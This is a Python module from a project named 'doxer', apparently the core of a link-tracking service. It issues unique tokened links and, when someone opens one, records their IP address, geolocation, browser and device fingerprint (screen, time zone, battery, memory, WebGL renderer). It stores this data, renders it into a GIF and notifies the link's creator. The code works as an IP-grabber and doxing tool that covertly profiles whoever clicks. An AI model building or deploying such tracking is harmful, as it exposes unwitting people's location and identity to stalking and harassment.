import logging
from datetime import datetime

import user_agents
from dishka import FromDishka

from doxer.application.dtos import (
    CreateUniqueLinkInputDTO,
    CreateUniqueLinkOutputDTO,
    GenerateGifInputDTO,
    GenerateGifOutputDTO,
)
from doxer.domain.entities import UniqueLink, UserData
from doxer.domain.ports import (
    GifGeneratorProtocol,
    IdGeneratorProtocol,
    LocationServiceProtocol,
    NotificationServiceProtocol,
    TokenHandlerProtocol,
    UniqueLinkRepositoryProtocol,
    UserDataRepositoryProtocol,
)
from doxer.domain.validators import TokenValidator
from doxer.domain.value_objects import BrowserData, JsData

logger = logging.getLogger(__name__)


class CreateUniqueLinkCommand:
    def __init__(
        self,
        id_generator: FromDishka[IdGeneratorProtocol],
        link_repo: FromDishka[UniqueLinkRepositoryProtocol],
        token_handler: FromDishka[TokenHandlerProtocol],
    ) -> None:
        self._id_generator = id_generator
        self._link_repo = link_repo
        self._token_handler = token_handler
        logger.debug("CreateUniqueLinkCommand initialized")

    async def execute(self, dto: CreateUniqueLinkInputDTO) -> CreateUniqueLinkOutputDTO:
        logger.info(f"Executing CreateUniqueLinkCommand for name: {dto.name}")
        try:
            token = self._token_handler.generate_token()
            logger.debug(f"Generated token: {token}")
            link = UniqueLink(
                id=self._id_generator.generate_id(),
                name=dto.name,
                token=token,
                created_at=datetime.now(),
            )
            logger.debug(f"Attempting to create link: {link}")
            await self._link_repo.create(link)
            logger.info(f"Successfully created link with name '{link.name}' and ID '{link.id}'")

            return CreateUniqueLinkOutputDTO(name=link.name, token=link.token)
        except Exception as e:
            logger.error(f"Error in CreateUniqueLinkCommand for name {dto.name}: {e}", exc_info=True)
            raise


class GenerateGifCommand:
    def __init__(
        self,
        id_generator: FromDishka[IdGeneratorProtocol],
        user_data_repo: FromDishka[UserDataRepositoryProtocol],
        token_validator: FromDishka[TokenValidator],
        token_handler: FromDishka[TokenHandlerProtocol],
        location_service: FromDishka[LocationServiceProtocol],
        gif_generator: FromDishka[GifGeneratorProtocol],
        notifier: FromDishka[NotificationServiceProtocol],
    ) -> None:
        self._id_generator = id_generator
        self._user_data_repo = user_data_repo
        self._token_validator = token_validator
        self._token_handler = token_handler
        self._location_service = location_service
        self._gif_generator = gif_generator
        self._notifier = notifier
        logger.debug("GenerateGifCommand initialized")

    async def execute(self, dto: GenerateGifInputDTO) -> GenerateGifOutputDTO:
        logger.info(f"Executing GenerateGifCommand for token {dto.token[:5]}..., name: {dto.name}")
        try:
            logger.debug("Validating token...")
            await self._token_validator.validate_token(dto.token)
            logger.debug("Marking token as used...")
            await self._token_handler.mark_as_used(dto.token)

            logger.debug("Parsing user agent...")
            ua = user_agents.parse(dto.user_agent)
            browser_data = BrowserData(
                browser=f"{ua.browser.family} {ua.browser.version_string}",
                os=f"{ua.os.family} {ua.os.version_string}",
                device=ua.device.family,
            )
            logger.debug(f"Parsed BrowserData: {browser_data}")

            logger.debug(f"Getting location data for IP: {dto.client_ip}")
            location_data = await self._location_service.get_location_data(dto.client_ip)
            logger.debug(f"Received LocationData: {location_data}")

            js_data = JsData(
                screen_resolution=dto.screen_resolution,
                color_depth=dto.color_depth,
                current_url=dto.current_url,
                time_zone=dto.time_zone,
                language=dto.language,
                platform=dto.platform,
                network_type=dto.network_type,
                battery_status=dto.battery_status,
                device_memory=dto.device_memory,
                logical_processors=dto.logical_processors,
                local_datetime=dto.local_datetime,
                webgl_renderer=dto.webgl_renderer,
            )
            logger.debug(f"Constructed JsData: {js_data}")

            user_data = UserData(
                id=self._id_generator.generate_id(),
                ip_address=dto.client_ip,
                browser_data=browser_data,
                location_data=location_data,
                js_data=js_data,
                timestamp=datetime.now(),
                token=dto.token,
                link_name=dto.name,
            )
            logger.debug(f"Attempting to create UserData: {user_data}")
            await self._user_data_repo.create(user_data)
            logger.info(f"Successfully created UserData with ID '{user_data.id}' for token {dto.token[:5]}...")

            logger.debug("Generating GIF...")
            gif_bytes = await self._gif_generator.create_gif_with_text(user_data)
            logger.debug(f"Generated GIF ({len(gif_bytes)} bytes)")

            logger.debug("Sending notification...")
            await self._notifier.send_notification(user_data)
            logger.debug("Notification sent.")

            return GenerateGifOutputDTO(
                gif_bytes=gif_bytes,
                user_data_id=user_data.id,
            )
        except Exception as e:
            logger.error(f"Error in GenerateGifCommand for token {dto.token[:5]}..., name {dto.name}: {e}", exc_info=True)
            raise